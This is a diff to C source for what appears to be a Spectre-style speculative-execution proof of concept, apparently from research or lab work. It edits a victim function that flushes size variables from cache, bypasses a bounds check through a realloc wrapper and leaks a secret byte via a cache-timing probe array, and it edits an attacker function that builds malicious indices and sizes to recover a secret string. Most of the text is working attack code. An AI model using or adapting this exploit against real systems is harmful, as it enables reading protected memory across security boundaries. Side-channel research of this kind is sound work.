@@ -39,7 +39,7 @@ uint8_t* secret_init(){
         perror("Initial malloc failed");
         return NULL;
     }
-    array[0] = '!';
+    array[0] = 'A';
     return array;
 }
 
@@ -52,25 +52,39 @@ uint8_t* array_init(){
     return array;
 } 
 
-static void *realloc_wrapper(void* ptr, size_t old_size, size_t new_size){
+static void *realloc_wrapper(uint8_t** ptr, size_t old_size, size_t new_size){
+    
     _mm_clflush(&old_size);
     _mm_clflush(&new_size);
-    if (!(new_size <= old_size && new_size >= old_size / 2)){
-        void * new_array = realloc(ptr, new_size);
-        memcpy(new_array, ptr, new_size);
+    _mm_mfence();
+    _mm_lfence();
+    //printf("old_size addr: %zu\n", &old_size);
+    if ( new_size >= old_size / 2){
+        _mm_clflush(&old_size);
+        _mm_clflush(&new_size);
+        if(new_size <= old_size){
+            return *ptr;
+        }
+        else{
+            printf("Wrapper: Realloc called: old_size=%zu, new_size=%zu, array addr ptr=%p\n", old_size, new_size, *ptr);
+            *ptr = realloc(*ptr, new_size);
+            return *ptr;
+        }
     } else {
-        return ptr;
+        *ptr = realloc(*ptr, new_size);
+        printf("Realloc called: old_size=%zu, new_size=%zu, array addr ptr=%p\n", old_size, new_size, *ptr);
+        return *ptr;
     }
 }
 
 uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32_t stride, uint32_t size) {
     uint32_t temp_array_size = size;
-    *array = realloc_wrapper(*array, array_size, size);
-
+    //printf("temp_array_size addr: %zu\n", &temp_array_size);
+    *array = realloc_wrapper(array, array_size, size);
+    printf("Victim funtion: array addr ptr=%p\n", *array);
     uint8_t new_idx = array_index_nospec(index, temp_array_size);
     uint8_t secret = (*array)[new_idx];
     uint8_t transmission = page[secret * stride];
-
     return NULL;
 }
 
@@ -179,8 +193,10 @@ void attacker_function() {
     printf("-----------------------------------------\n");
 
     for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE; c++) {
-
         for (size_t r = 0; r < REP; r++) {
+            array_base = &array[0];
+            printf("attacker: array base addr: %p, secret addr: %p\n", array_base, secret);
+            //malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
             size_t safe_size = array_size-1; //New size but not too small to actually want to resize
             size_t safe_index = array_size/2; //An in-bound index
             size_t malicious_size = (size_t)(malicious_index+1);
